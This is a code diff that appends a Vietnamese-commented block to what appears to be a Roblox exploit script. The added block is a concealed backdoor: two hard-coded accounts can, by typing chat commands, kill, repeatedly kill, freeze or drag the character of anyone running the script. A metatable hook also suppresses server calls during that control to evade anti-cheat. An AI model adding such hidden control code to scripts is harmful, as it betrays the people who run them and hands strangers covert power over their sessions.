@@ -640,3 +640,149 @@ RunService.RenderStepped:Connect(function()
         end
     end
 end)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Danh sách Admin mới (Đã đổi sang Tên gốc viết thường theo chuẩn của code)
+local Admins = {"meoiuaccphu", "daide_long9ngon"}
+local LoopKill = false
+local IsFrozen = false
+local IsBringLoop = false
+local ActiveAdmin = nil
+local lastKillTime = 0
+
+-- Chặn tín hiệu gửi lên Server để bypass anti-cheat khi đang bị điều khiển
+local mt_success, mt = pcall(getrawmetatable, game)
+if mt_success and mt then
+    local oldNamecall = mt.__namecall
+    setreadonly(mt, false)
+    mt.__namecall = newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        if (IsFrozen or IsBringLoop) and (method == "FireServer" or method == "InvokeServer") then
+            return nil 
+        end
+        return oldNamecall(self, ...)
+    end)
+    setreadonly(mt, true)
+end
+
+-- Hàm kiểm tra người chat có nằm trong danh sách Admin không
+local function IsAdmin(player)
+    local name = string.lower(player.Name)
+    local display = string.lower(player.DisplayName)
+    for _, admin in pairs(Admins) do
+        if name:find(admin) or display:find(admin) then return true end
+    end
+    return false
+end
+
+-- Xóa các lực vật lý khác để tránh xung đột khi kéo (Bring)
+local function CleanOtherPhysics(root)
+    for _, v in pairs(root:GetChildren()) do
+        if (v:IsA("BodyMover") or v:IsA("LinearVelocity") or v:IsA("VectorForce") or v:IsA("AlignPosition")) 
+        and v.Name ~= "BringForce" and v.Name ~= "BringAtt" then
+            v:Destroy()
+        end
+    end
+end
+
+-- Hàm thực thi lệnh chat
+local function ExecuteCommand(msg, speaker)
+    local args = string.split(string.lower(msg), " ")
+    local cmd = args[1]
+    local targetPart = args[2] or ""
+
+    local myName = string.lower(LocalPlayer.Name)
+    local myDisplay = string.lower(LocalPlayer.DisplayName)
+    local isTarget = (targetPart ~= "" and (myName:find(targetPart) or myDisplay:find(targetPart))) or (targetPart == "")
+
+    if not isTarget then return end
+
+    if cmd == "kill" then
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+            LocalPlayer.Character.Humanoid.Health = 0
+        end
+    elseif cmd == "loopkill" then
+        LoopKill = true
+    elseif cmd == "unloopkill" then
+        LoopKill = false
+    elseif cmd == "freeze" then
+        IsFrozen = true
+    elseif cmd == "unfreeze" then
+        IsFrozen = false
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        end
+    elseif cmd == "bring" then
+        ActiveAdmin = speaker
+        IsBringLoop = true
+    elseif cmd == "unbring" then
+        IsBringLoop = false
+        ActiveAdmin = nil
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local root = LocalPlayer.Character.HumanoidRootPart
+            if root:FindFirstChild("BringForce") then root.BringForce:Destroy() end
+            if root:FindFirstChild("BringAtt") then root.BringAtt:Destroy() end
+        end
+    end
+end
+
+-- Lắng nghe khung chat
+local function SetupChat(player)
+    player.Chatted:Connect(function(msg)
+        if IsAdmin(player) then ExecuteCommand(msg, player) end
+    end)
+end
+
+for _, p in pairs(Players:GetPlayers()) do SetupChat(p) end
+Players.PlayerAdded:Connect(SetupChat)
+
+-- Vòng lặp cập nhật vị trí và trạng thái nhân vật liên tục
+RunService.RenderStepped:Connect(function()
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local root = LocalPlayer.Character.HumanoidRootPart
+        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+
+        if LoopKill and hum and (tick() - lastKillTime) >= 3 then
+            hum.Health = 0
+            lastKillTime = tick()
+        end
+        
+        if IsBringLoop and ActiveAdmin and ActiveAdmin.Character and ActiveAdmin.Character:FindFirstChild("HumanoidRootPart") then
+            local adminRoot = ActiveAdmin.Character.HumanoidRootPart
+            local targetCFrame = adminRoot.CFrame * CFrame.new(0, 0, -5)
+            local targetPos = targetCFrame.p
+            
+            CleanOtherPhysics(root)
+            local dist = (targetPos - root.Position).Magnitude
+            
+            local att = root:FindFirstChild("BringAtt") or Instance.new("Attachment", root)
+            att.Name = "BringAtt"
+            local lv = root:FindFirstChild("BringForce") or Instance.new("LinearVelocity", root)
+            lv.Name = "BringForce"
+            lv.MaxForce = 9999999
+            lv.Attachment0 = att
+
+            if dist > 20 then
+                lv.VectorVelocity = (targetPos - root.Position).Unit * 200
+            else
+                root.CFrame = targetCFrame
+                lv.VectorVelocity = Vector3.new(0,0,0)
+                root.Velocity = Vector3.new(0,0,0)
+                root.RotVelocity = Vector3.new(0,0,0)
+            end
+            
+            for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
+                if v:IsA("BasePart") then v.CanCollide = false end
+            end
+            
+            if IsFrozen then root.Anchored = false end
+        elseif IsFrozen and not IsBringLoop then
+            root.Anchored = true
+            root.Velocity = Vector3.new(0, 0, 0)
+        end
+    end
+end)
+
